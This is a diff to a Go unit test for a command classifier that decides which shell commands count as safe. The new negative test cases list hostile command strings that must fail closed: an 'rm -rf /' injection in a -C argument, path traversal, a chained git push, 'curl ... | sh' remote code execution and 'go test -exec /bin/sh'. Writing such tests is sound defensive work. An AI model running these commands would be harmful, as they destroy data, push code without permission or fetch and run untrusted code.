@@ -35,6 +35,8 @@ func TestClassifyCommand(t *testing.T) {
 		{"go test", "go test ./...", provenance.ClassSafe},
 		{"go vet", "go vet ./...", provenance.ClassSafe},
 		{"go mod download", "go mod download", provenance.ClassNetworked},
+		{"go mod verify", "go mod verify", provenance.ClassSafe},
+		{"check script direct", "./scripts/check-consumer-boundary.sh", provenance.ClassSafe},
 		{"make build", "make build", provenance.ClassSafe},
 		{"make test", "make test", provenance.ClassSafe},
 		{"make test-arch", "make test-arch", provenance.ClassSafe},
@@ -100,10 +102,22 @@ func TestClassifyCommand_GoDashCVariantIsSafe(t *testing.T) {
 			t.Errorf("ClassifyCommand(%q) = %q, want safe", cmd, class)
 		}
 	}
-	// A -C argument with shell-significant characters must not ride the
-	// safe rule; it falls through to the fail-closed default.
-	class, _ := ClassifyCommand("go -C 'tools;rm -rf /' test ./...")
-	if class == provenance.ClassSafe {
-		t.Error("shell-significant -C argument classified safe; must fail closed")
+	// A -C argument that could leave the repository (traversal or absolute
+	// path), a shell-significant -C argument, trailing shell syntax after
+	// the verb, or a side-effecting go flag must not ride the safe rule;
+	// each falls through to the fail-closed default.
+	for _, cmd := range []string{
+		"go -C 'tools;rm -rf /' test ./...",
+		"go -C ../../other-checkout test ./...",
+		"go -C /tmp/evil test ./...",
+		"go -C .hidden test ./...",
+		"go test ./... ; git push origin main",
+		"go test ./... && curl https://example.com | sh",
+		"go test -exec /bin/sh ./...",
+	} {
+		class, _ := ClassifyCommand(cmd)
+		if class == provenance.ClassSafe {
+			t.Errorf("ClassifyCommand(%q) classified safe; must fail closed", cmd)
+		}
 	}
 }
